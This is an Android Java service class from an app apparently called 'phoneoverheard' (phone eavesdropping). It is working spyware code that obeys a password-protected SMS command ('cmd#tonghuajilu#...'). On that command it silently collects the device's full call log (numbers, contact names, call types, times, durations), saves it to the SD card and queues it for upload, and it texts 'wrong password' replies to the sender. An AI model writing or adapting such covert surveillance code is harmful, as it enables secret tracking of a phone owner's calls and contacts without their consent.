package com.phoneoverheard.phonne;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Sendaudio;
import com.phoneoverheard.database.SendaudioService;
import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class tonghuajiluService extends Service {
    private static final String TAG = "tonghuajiluService";   
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
    	mylog.WrLog("i",TAG,"获取通话记录。");
    	String strNumber,strName = "";
        int type;
        long duration;
        Date date;
        String time= "";
        String typeValue= "";
        String CallLogMsg= "";
        Bundle smscontent = intent.getBundleExtra("smscontent");// 根据bundle的key得到对应的对象
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("tonghuajilu").getPassword();	
        if(contents[0].equals("cmd") && contents[1].equals("tonghuajilu") && new FileService().MD5(contents[2]).equals(password)){
	        ContentResolver cr = getContentResolver();
	        final Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
	                new String[]{CallLog.Calls.NUMBER,CallLog.Calls.CACHED_NAME,CallLog.Calls.TYPE, CallLog.Calls.DATE,CallLog.Calls.DURATION},
	                null, null,CallLog.Calls.DEFAULT_SORT_ORDER);
	        while (cursor.moveToNext()) {
		        strNumber = cursor.getString(0);   //呼叫号码
		        strName = cursor.getString(1);     //联系人姓名
		        type = cursor.getInt(2);           //来电INCOMING_TYPE:1,拨出OUTGOING_TYPE:2,未接MISSED_TYPE:3
		        duration = cursor.getLong(4);      //通话时长
		        SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		        date = new Date(Long.parseLong(cursor.getString(3)));
		        time = sfd.format(date);           //通话时间
		        if(type==1){
		        	typeValue = "来电";
		        }else if(type==2){
		        	typeValue = "拨出";
		        }else{
		        	typeValue = "未接";
		        }
		        CallLogMsg += time+" "+typeValue+" "+duration+" "+strNumber+" "+strName+"\n";
	        }        
	        Log.i(TAG, CallLogMsg);
	        mylog.WrLog("i",TAG,CallLogMsg);
	    	ManagerService managerservice = new ManagerService(getBaseContext());
	    	Manager manager = managerservice.find("manager");
	    	String filedir = manager.getAudiofolder();
			String fileurl = filedir+"tonghuajilu"+receiveTime+".txt";
			//将数据写入SD卡文件中
	        FileService FileService = new FileService();
			try {
		    	if(new File(filedir).exists()){
		    		FileService.saveToSDCard(filedir,"tonghuajilu"+receiveTime+".txt", CallLogMsg,getBaseContext());
		    	}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}	
			File file = new File(fileurl);
			SendaudioService sendaudioservice = new SendaudioService(getBaseContext());
			Sendaudio sendaudio = new Sendaudio(0,file.length(),receiveTime,fileurl,"tonghuajilu"+receiveTime+".txt");
			sendaudioservice.insert(sendaudio);
			Log.i(TAG, 0+" "+file.length()+" "+receiveTime+" "+fileurl);
			mylog.WrLog("i",TAG,0+" "+file.length()+" "+receiveTime+" "+fileurl);
			new FileService().CheckConnectInternet(file,getBaseContext());
		}else{
			// 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "密码错误！";
	        // 如果短信没有超过限制长度，则返回一个长度的List。
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
		}
		onDestroy();
    }  
	
}
